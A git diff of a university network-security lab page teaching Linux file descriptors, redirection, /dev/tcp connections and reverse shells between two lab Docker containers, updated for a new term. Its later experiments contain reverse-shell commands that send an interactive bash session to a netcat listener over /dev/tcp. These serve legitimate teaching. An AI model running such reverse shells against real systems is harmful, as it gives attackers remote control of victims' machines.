@@ -1,8 +1,8 @@
 ---
 layout: page
-title: Reverse shell setup
-last_modified_date: Thu Jan 11 11:20:38 2024
-current_term: Winter 2023-24
+title: Reverse shell minilab
+last_modified_date: 2025-01-08 17:00
+current_term: Winter 2024-25
 nav_order: 10
 parent: Concepts
 nav_exclude: false
@@ -29,97 +29,43 @@ can use that to create a reverse shell from one machine to another.
 At the end of this concept lab, you should be able:
 
 - Define how input and output redirection works in Linux.
-- Create TCP connection without specifically creating a server.
+- Create a TCP connection without specifically creating a server.
 - Explore creating a reverse shell in Linux over a TCP connection.
 
 # Logistics
 
-## Getting the configuration
+For this lab, we will be using GitHub classroom to get the starter code. Please
+follow this [link]() to accept the assignment and obtain your own fork of the
+lab repository.
 
-To start with this concept lab, login to the class server, and navigate to your
-`netsec-labs-username` directory. Grab the latest updates using:
+{: .important }
+The first time you accept an invite, you will be asked to link your account to
+your student email and name. Please be careful and choose your appropriate
+name/email combination so that I can grade appropriately.
+
+## Generating your `.env` file
+
+Before we spin up our containers, there are some configuration variables that
+must be generated on the spot. To do so, please run the `gen_env_file.sh`
+script from the prelab repository directory as follows:
 
   ```shell
-  (class-server) $ git fetch upstream
-  (class-server) $ git pull upstream main
+  $ ./gen_env_file.sh
   ```
 
-A folder called `revshell` should show up in your directory, that is where you
-will do most of your lab.
+If run correctly, several files will be generated:
 
-## Patching the docker file
+1. `.env` (hidden file - use `ls -al` to see it) contains your UID and GID
+   variables.
 
-{:.warning}
-Before starting here, please make sure that your experiments from all other
-labs are down.  To do so, navigate back to the latest lab directory and do
-`docker compose down`.
+2. `connect_*.sh` a utility script to quickly connect to each container in this
+   lab.
 
-I have updated the patch script to no longer ask you for your username and
-subnet, it will try to extract those on its own and print out your subnet (it
-is the same on as the one announced on the Moodle page). Also, it now generates
-scripts for you to connect to your hosts quickly.
+## Network topology
 
-To do so, in the `tcplab` directory, run the patch script:
-
-  ```sh
-  (class-server) $ ./patch_docker_compose.sh
-  Attempting to fetch subnet automatically...
-  Found your subnet, it is 10.10.0
-  Done...
-  ```
-
-If you had already patched your script, you will see something like this:
-
-  ```sh
-  (class-server) $ ./patch_docker_compose.sh
-  Attempting to fetch subnet automatically...
-  Found your subnet, it is 10.10.0
-  [ERROR] ########################################################################
-  [ERROR] # It looks like your docker-compose.yml file has already been patched. #
-  [ERROR] #                                                                      #
-  [ERROR] # If you are having issues bringing up the environment, it means it is #
-  [ERROR] #  still in use.                                                       #
-  [ERROR] #                                                                      #
-  [ERROR] # Try to take down the experiment first, then bring it up again.       #
-  [ERROR] #  To bring it down: docker compose down                               #
-  [ERROR] #  To bring it up:   docker compose up -d                              #
-  [ERROR] ########################################################################
-  ```
-
-If for some reason, the script fails to find your subnet, you can override its
-behavior by providing your subnet on the command line:
-
-  ```sh
-  (class-server) $ ./patch_docker_compose.sh SUBNET
-  ```
-
-If all goes well, you should also see two new files in your directory:
-`connct_client.sh` and `connect_server.sh`. You can use these scripts to
-directly connect to the desired host, without having to type the whole `docker
-container exec -it` command. Finally, I have also adjust the container's
-hostnames to make it easier for you to identify which is which.
-
-For example, to connect to `client`, you can use:
-
-  ```sh
-	$ ./connect_client.sh
-  ┌──(root㉿client)-[/]
-  └─#
-  ```
-
-Hopefully, that would make things a bit easier for you.
-
-{:.highlight}
-If you are unable to execute a script due to a permissions issue, then try the
-following `$ chmod +x <script name.sh>` to make it executable and try again.
-
-{:.warning}
-In the remainder of this document, I will not be using your specific prefixes
-and subnets. For example, when I refer to `client`, you should replace that with
-`user-client` where `user` is your RHIT username. Similarly, I will be using
-`10.10.0` as the default subnet, you should replace that in all IP addresses
-with your own subnet. For example, if your subnet is `10.11.0`, then replace the
-IP address `10.10.0.1` with `10.11.0.1`.
+The topology for this minilab consists of only two machines, a server and a
+client. The client has the IPv4 address of 10.10.0.4 while the server has the
+IPv4 address of 10.10.0.5.
 
 ---
 
@@ -140,10 +86,11 @@ My file descriptors are the following:
   stdout: 1
   stderr: 2
 ```
-The process id in your case will be different, make not of that value. This is
-the id of that program when it is running, i.e., when it is a process in the
-container. We would like to check out the files that this process has access
-to.
+
+**The process id in your case will be different**, make note of that value.
+This is the id of that program when it is running, i.e., when it is a process
+in the container. We would like to check out the files that this process has
+access to.
 
 If you look at the source code (pasted below), you can see that the process,
 after printing its process id, prints out the values for each of its default
@@ -174,7 +121,9 @@ int main(int argc, char **argv) {
 Let's examine the actual files that these descriptors correspond to. To do so,
 make can make use of `procfs`, a virtual file system that allows us to read
 information about our processes. On the same container, while the program is
-still running, grab another terminal and check out the process's files:
+still running, grab another terminal and check out the process's files (make
+sure to process `26` below with the process id printed out by your running
+instance):
 
 ```sh
 $ ls -al /proc/26/fd
@@ -189,6 +138,9 @@ lrwx------ 1 root root 64 Jan 11 16:42 1 -> /dev/pts/1
 lrwx------ 1 root root 64 Jan 11 16:42 2 -> /dev/pts/1
 ```
 
+Your will of course look a bit different, but you should see significant
+similarities.
+
 ## Question sheet
 
 By looking at those value, answer the following question.
@@ -199,8 +151,8 @@ By looking at those value, answer the following question.
 
 ## Kill the program
 
-You can now kill the running program using `C-c` on the terminal it is running
-into.
+You can now kill the running program using `C-c` (control + c) on the terminal
+it is running in.
 
 # Experiment 2: Redirection
 
@@ -209,14 +161,14 @@ Using the same source code, let's first create a simple plaintext file that
 contains any garbage data you like. You can do that quickly using `touch
 input.txt`, this will create an empty file called `input.txt`.
 
-Then, run the `simple_loop.bin` with the following command:
+Then, run the `simple_loop.bin` binary with the following command:
 
 ```sh
 $ ./simple_loop.bin 0< input.txt
 ```
 
 Based on the value of the process id, examine the file mappings for the newly
-created process.
+created process in `procfs`.
 
 ## Question sheet
 
@@ -243,6 +195,7 @@ for it using:
 ```sh
 $ pidof simple_loop.bin
 ```
+
 It should give you the process id you are looking for.
 
 ## Question sheet
@@ -260,6 +213,7 @@ following question:
 1. By combining your observations from experiments 2 and 3, can you suggest a
    method to map the standard error (`stderr`) of the process into a separate
    file? Write down such a command.
+
    - _Hint_: Feel free to experiment a bit and check out the mappings using the
     same techniques we did above.
 
@@ -270,9 +224,10 @@ the same location (i.e., we'd like `stdin` to read from the same file that
 `stdout` outputs to).
 
 Run `simple_loop.bin` with the following command:
-```sh
-$ ./simple_loop.bin > output.txt 0<&1
-```
+
+  ```sh
+  $ ./simple_loop.bin > output.txt 0<&1
+  ```
 
 ## Question sheet
 
@@ -297,36 +252,33 @@ around with it a bit.
 
 Using what we have done in the previous experiments, can you suggest a command
 for `simple_prompt.bin` to read its input from a file (say `input.txt`) instead
-of the waiting for the user to enter it from the command line?
+of waiting for the user to enter it from the command line?
 
 1. Please write down your command in the question sheet.
 
 ## Experiment 5.2: `/dev/tcp`
 
 In this experiment, we'd like to explore the `/dev/tcp` pseudo file. Much like
-`/proc`, Linux provides use with a pseudo file under `/dev/tcp` that allows you
+`/proc`, Linux provides us with a pseudo file under `/dev/tcp` that allows you
 to set up a TCP connection to a remote machine, and then redirect your standard
 input, output, and error to that TCP connection.
 
 Let's exploit this fact to implement `netcat` without actually having `netcat`
 available for us. Grab two terminal windows, one running on the server
-container, and another running on the client container.
+container and another running on the client container.
 
 On the server, start a `netcat` server using:
-```sh
-$ nc -n -v -l 9090
-```
+  ```sh
+  $ nc -n -v -l 9090
+  ```
 This will start listening for incoming TCP connections on port 9090.
 
 On the client machine, let's send a message to this `netcat` server without
-actually using the `nc` command. To do so, use the following command:
+using the `nc` command. To do so, use the following command:
 
-```sh
-$ echo 'Hello' > /dev/tcp/10.10.0.5/9090
-```
-
-{:.warning}
-Make sure to replace `10.10.0.5` with the IP of your own server machine.
+  ```sh
+  $ echo 'Hello' > /dev/tcp/10.10.0.5/9090
+  ```
 
 ## Question sheet
 
@@ -341,18 +293,19 @@ questions:
 Now, let's make things a bit more fun. Using the same setup, start a netcat
 server on the server machine using:
 
-```sh
-$ nc -n -v -l 9090
-```
+  ```sh
+  $ nc -n -v -l 9090
+  ```
 
 However, on the client side, run the following command:
 
-```sh
-$ /bin/bash -i > /dev/tcp/10.10.0.5/9090
-```
+  ```sh
+  $ /bin/bash -i > /dev/tcp/10.10.0.5/9090
+  ```
 
 You will notice that you are still in bash, however, a new instance of `bash`
-has been created in interactive mode.
+has been created in interactive mode (thus the `-i` above which stands for
+interactive).
 
 ## Question sheet
 
@@ -367,9 +320,9 @@ directory using `ls` on the client machine. Where does the output show up?
 ## A bit more fun
 
 On the client machine, start a `vim` session. You will receive a warning from
-`vim` that the output is funky, ignore that. A few moment later, `vim` will
+`vim` that the output is funky, ignore that. A few moments later, `vim` will
 **show up on the server** container all the while allowing you to edit and enter
-command **from the client** container.
+commands **from the client** container.
 
 We have just offloaded the rendering of the `vim` session to the server all the
 while doing the editing commands on the client container.
@@ -384,16 +337,16 @@ server to exit using `C-c` on the server for the connection to be dropped
 This experiment is optional, though it might be helpful with the last
 experiment. On the server container, launch a `netcat` server using:
 
-```sh
-$ nc -n -v -l 9090
-```
+  ```sh
+  $ nc -n -v -l 9090
+  ```
 
 On the client container, launch the `simple_prompt.bin` program while asking it
 to read the input from the **server connection**.
 
-```sh
-$ ./simple_prompt.bin 0< /dev/tcp/10.10.0.5/9090
-```
+  ```sh
+  $ ./simple_prompt.bin 0< /dev/tcp/10.10.0.5/9090
+  ```
 
 The client's program will hang waiting for input, however try as you can you
 will not be able to provide it with input. However, switch to the server
@@ -410,21 +363,22 @@ create.
 
 Starting with the same setup, start a `netcat` server on the server container
 using:
-```sh
-$ nc -n -v -l 9090
-```
+  ```sh
+  $ nc -n -v -l 9090
+  ```
 
-On the client, design a command that will allow you to create a new client
-shell **but on the server machine**. In other words, what we'd like to happen
-is that after launching this command, the server will find itself with a full
-blown root shell running on the client, doing whatever it likes to that client.
+On the client, design a command that will allow you to create a new interactive
+client shell **but on the server machine**. In other words, what we'd like to
+happen is that after launching this command, the server will find itself with a
+full blown shell running on the client, doing whatever it likes to that client.
 
 ## Question sheet
 
 1. Write down the command you used to establish a client root shell on the
    server container.
 
+<!--
 2. Given what we have discussed in the TCP concept lab and the vulnerabilities
    in TCP, can you design an exploit that allows you to perform such an attack
    on an unsuspecting machine?
-
+-->
